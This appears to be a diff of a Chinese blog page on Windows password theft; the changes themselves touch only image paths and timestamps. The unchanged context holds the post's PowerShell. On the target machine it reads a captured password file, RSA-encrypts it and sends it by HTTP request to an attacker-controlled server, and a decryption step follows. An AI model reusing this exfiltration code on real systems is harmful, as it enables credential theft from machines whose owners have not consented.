@@ -14,12 +14,12 @@
 <meta property="og:site_name" content="Trace Blog">
 <meta property="og:description" content="Windows密码窃取背景在很多渗透测试过程中，需要实时监控一些数据，比如Windows的密码等。网上已经很多工具和方法实现，但是都只是将数据保存在本地，无法远程获取。所以一旦丢失权限，还是那不到密码。出于这个需求就开发了此脚本。 技术细节此脚本才用powershell编写,数据通过RSA加密，HTTP协议传输，所以注定了只能传输很少的内容。此脚本工作涉及三台机器,Target，VPS，Hacke">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2018/04/26/Windows密码窃取/Windows密码窃取/http.PNG">
-<meta property="og:updated_time" content="2018-04-25T18:44:21.000Z">
+<meta property="og:image" content="http://yoursite.com/2018/04/26/Windows密码窃取/http.PNG">
+<meta property="og:updated_time" content="2018-04-25T18:52:29.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Trace Blog">
 <meta name="twitter:description" content="Windows密码窃取背景在很多渗透测试过程中，需要实时监控一些数据，比如Windows的密码等。网上已经很多工具和方法实现，但是都只是将数据保存在本地，无法远程获取。所以一旦丢失权限，还是那不到密码。出于这个需求就开发了此脚本。 技术细节此脚本才用powershell编写,数据通过RSA加密，HTTP协议传输，所以注定了只能传输很少的内容。此脚本工作涉及三台机器,Target，VPS，Hacke">
-<meta name="twitter:image" content="http://yoursite.com/2018/04/26/Windows密码窃取/Windows密码窃取/http.PNG">
+<meta name="twitter:image" content="http://yoursite.com/2018/04/26/Windows密码窃取/http.PNG">
   
     <link rel="alternate" href="/atom.xml" title="Trace Blog" type="application/atom+xml">
   
@@ -82,7 +82,7 @@
 <h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><p>此脚本才用powershell编写,数据通过RSA加密，HTTP协议传输，所以注定了只能传输很少的内容。此脚本工作涉及三台机器,Target，VPS，Hacker.<br>第一步：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成公钥和私钥保存起来</span></span><br><span class="line"><span class="variable">$rsa</span> = <span class="built_in">New-Object</span> -TypeName System.Security.Cryptography.RSACryptoServiceProvider</span><br><span class="line"><span class="variable">$publickey</span> = <span class="variable">$rsa</span>.ToXmlString(<span class="string">"false"</span>);</span><br><span class="line"><span class="variable">$publickey</span>;</span><br><span class="line"><span class="variable">$privatekey</span> = <span class="variable">$rsa</span>.ToXmlString(<span class="string">"true"</span>);</span><br><span class="line"><span class="variable">$privatekey</span>;</span><br></pre></td></tr></table></figure></p>
 <p>第二步:在VPS上起一个web服务,建议安装apache。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eg.</span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure></p>
 <p>第三步:在target上的操作。<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rsa</span>.FromXmlString(<span class="variable">$publickey</span>);</span><br><span class="line"><span class="variable">$rsa</span> = <span class="built_in">New-Object</span> -TypeName System.Security.Cryptography.RSACryptoServiceProvider</span><br><span class="line"><span class="variable">$p</span> = <span class="built_in">Get-Content</span> -Path c:\temp\<span class="number">1</span>.txt</span><br><span class="line"><span class="variable">$p_b</span> = [System.Text.Encoding]::Unicode.GetBytes(<span class="variable">$p</span>)</span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$rsa</span>.Encrypt(<span class="variable">$p_b</span>,<span class="string">"false"</span>)</span><br><span class="line"><span class="variable">$b_64</span> = [Convert]::ToBase64String(<span class="variable">$e</span>)</span><br><span class="line"><span class="variable">$url</span> = <span class="string">"http://192.168.1.8/aaabbb"</span>+<span class="variable">$b_64</span></span><br><span class="line"><span class="comment"># aaabbb作为标识符</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="variable">$url</span></span><br></pre></td></tr></table></figure></p>
-<p>此时 你就已经可以看到请求了。<br><img src="./Windows密码窃取/http.PNG" alt=""></p>
+<p>此时 你就已经可以看到请求了。<br><img src="http.PNG" alt=""></p>
 <p>下面是解码代码<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b_byte</span> = [System.Convert]::FromBase64String(<span class="variable">$b_64</span>)</span><br><span class="line"><span class="variable">$rsa</span>.FromXmlString(<span class="variable">$privatekey</span>)           </span><br><span class="line"><span class="variable">$p_t</span> = <span class="variable">$rsa</span>.Decrypt(<span class="variable">$e</span>, <span class="string">"false"</span>) </span><br><span class="line"><span class="variable">$result</span> = [System.Text.Encoding]::Unicode.GetString(<span class="variable">$p_t</span>)</span><br></pre></td></tr></table></figure></p>
 <p>通过这样的几步，我们就安全的拿到了我们想要的密码。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实这是一种通用的方案，很多渗透情景都可以用这种思路。这个脚本在这里不提供全部代码，有兴趣的同学应该可以自行编写。至于这个脚本什么时间上传，如何启动，大家思路不一样，就仁者见仁智者见智了，不再本文的讨论范围内。</p>
@@ -90,7 +90,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/26/Windows密码窃取/" data-id="cjgfg9ibm0000ngyl5quo7rn8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/04/26/Windows密码窃取/" data-id="cjgfgillt0000upylmam41ktm" class="article-share-link">Share</a>
       
       
     </footer>
